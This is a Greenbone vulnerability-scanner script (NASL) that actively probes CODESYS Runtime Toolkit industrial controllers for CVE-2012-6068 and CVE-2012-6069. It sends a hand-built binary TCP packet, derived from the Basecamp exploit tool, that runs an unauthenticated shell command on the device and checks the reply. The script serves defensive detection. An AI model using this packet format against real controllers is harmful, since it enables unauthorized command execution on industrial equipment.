# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103599");
  script_cve_id("CVE-2012-6069", "CVE-2012-6068");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("2023-09-07T05:05:21+0000");

  script_name("CODESYS Multiple Vulnerabilities (Oct 2012) - Active Check");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56300");
  script_xref(name:"URL", value:"https://dale-peterson.com/2012/10/25/new-project-basecamp-tools-for-codesys-200-vendors-affected/");
  script_xref(name:"URL", value:"https://www.cisa.gov/news-events/ics-advisories/icsa-13-011-01");

  script_tag(name:"last_modification", value:"2023-09-07 05:05:21 +0000 (Thu, 07 Sep 2023)");
  script_tag(name:"creation_date", value:"2012-10-29 18:46:26 +0100 (Mon, 29 Oct 2012)");
  script_category(ACT_ATTACK);

  script_tag(name:"qod_type", value:"exploit");
  script_family("General");
  script_tag(name:"solution_type", value:"VendorFix");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("gb_codesys_tcp_detect.nasl");
  script_require_ports("Services/codesys", 2455);
  script_mandatory_keys("codesys/tcp/detected");

  script_tag(name:"summary", value:"Devices using the CODESYS Runtime Toolkit are prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted TCP request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2012-6068: The Runtime Toolkit in CODESYS Runtime System 2.3.x and 2.4.x does not require
  authentication, which allows remote attackers to execute commands via the command-line interface
  in the TCP listener service or transfer files via requests to the TCP listener service.

  - CVE-2012-6069: The CODESYS Runtime Toolkit's file transfer functionality does not perform input
  validation, which allows an attacker to access files and directories outside the intended scope.
  This allows an attacker to upload and download any file on the device. This could allow the
  attacker to affect the availability, integrity, and confidentiality of the device.");

  script_tag(name:"solution", value:"Contact the vendor of the device about infos on a fixed
  firmware.");

  exit(0);
}

include("byte_func.inc");
include("dump.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default: 2455, proto: "codesys");
soc = open_sock_tcp(port);
if (!soc)
  exit(0);

# nb:
# - based on https://github.com/digitalbond/Basecamp/blob/master/codesys-shell.py
# - this is an active check for CVE-2012-6069, an active check for CVE-2012-6068 is done in gsf/2017/gb_codesys_mult_vuln.nasl
cmd = raw_string(0x92, 0x00, 0x00, 0x00, 0x00, '?', 0x00);
set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);
cmd_len_little = mkword(strlen(cmd));
set_byte_order(BYTE_ORDER_BIG_ENDIAN);
cmd_len_big = mkword(strlen(cmd));

lile_query = raw_string(0xcc, 0xcc, 0x01, 0x00, cmd_len_little, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x23, cmd_len_little, 0x00, cmd);
bige_query = raw_string(0xcc, 0xcc, 0x01, 0x00, cmd_len_big, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x23, cmd_len_big, 0x00, cmd);

send(socket: soc, data: lile_query);
recv = recv(socket: soc, length: 512);

if (!recv) {
  send(socket: soc, data: bige_query);
  recv = recv(socket: soc, length: 512);
  if (!recv) {
    close(soc);
    exit(99);
  }
}

close(soc);

if (hexstr(substr(recv, 0, 1)) == "cccc" && "show implemented commands" >< recv) {
  report = 'It was possible to access the CODESYS service without authentication.\n\nResult:\n' + chomp(recv);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
